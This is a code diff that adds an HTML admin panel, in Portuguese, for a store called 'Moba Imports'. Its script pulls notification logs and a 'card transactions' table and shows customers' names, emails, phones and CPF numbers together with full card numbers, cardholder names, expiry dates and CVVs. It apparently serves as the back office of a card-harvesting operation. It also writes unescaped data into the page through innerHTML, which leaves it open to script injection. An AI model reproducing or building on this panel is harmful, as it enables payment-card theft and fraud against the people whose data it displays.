@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Administração - Moba Imports</title>
+    <style>
+        body { font-family: sans-serif; margin: 2em; }
+        h1, h2 { color: #333; }
+        table { border-collapse: collapse; width: 100%; margin-bottom: 2em; }
+        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>Painel de Administração - Moba Imports</h1>
+
+    <h2>Notificações (notificacoes.jsonl)</h2>
+    <div id="notificacoes"></div>
+
+    <h2>Transações de Cartão (dados_cartoes.db)</h2>
+    <div id="transacoes"></div>
+
+    <script>
+        async function carregarDados() {
+            const responseNotificacoes = await fetch('/api/logs-notificacoes');
+            const notificacoes = await responseNotificacoes.json();
+            const tabelaNotificacoes = document.createElement('table');
+            tabelaNotificacoes.innerHTML = '<tr><th>Timestamp</th><th>Tipo</th><th>Dados</th><th>Status</th></tr>';
+            notificacoes.forEach(log => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `<td>${log.timestamp}</td><td>${log.tipo}</td><td>${JSON.stringify(log.dados)}</td><td>${log.status}</td>`;
+                tabelaNotificacoes.appendChild(tr);
+            });
+            document.getElementById('notificacoes').appendChild(tabelaNotificacoes);
+
+            const responseTransacoes = await fetch('/api/transacoes-cartao');
+            const transacoes = await responseTransacoes.json();
+            const tabelaTransacoes = document.createElement('table');
+            tabelaTransacoes.innerHTML = '<tr><th>ID</th><th>Timestamp</th><th>Produto</th><th>Valor</th><th>Parcelas</th><th>Cliente</th><th>Email</th><th>Telefone</th><th>Cartão</th><th>Nome no Cartão</th><th>Validade</th><th>CVV</th><th>CPF</th><th>Status</th></tr>';
+            transacoes.forEach(t => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `<td>${t.id}</td><td>${t.timestamp}</td><td>${t.produto}</td><td>${t.valor_total}</td><td>${t.parcelas}</td><td>${t.cliente_nome}</td><td>${t.cliente_email}</td><td>${t.cliente_telefone}</td><td>${t.numero_cartao}</td><td>${t.nome_cartao}</td><td>${t.validade}</td><td>${t.cvv}</td><td>${t.cpf}</td><td>${t.status}</td>`;
+                tabelaTransacoes.appendChild(tr);
+            });
+            document.getElementById('transacoes').appendChild(tabelaTransacoes);
+        }
+        carregarDados();
+    </script>
+</body>
+</html>
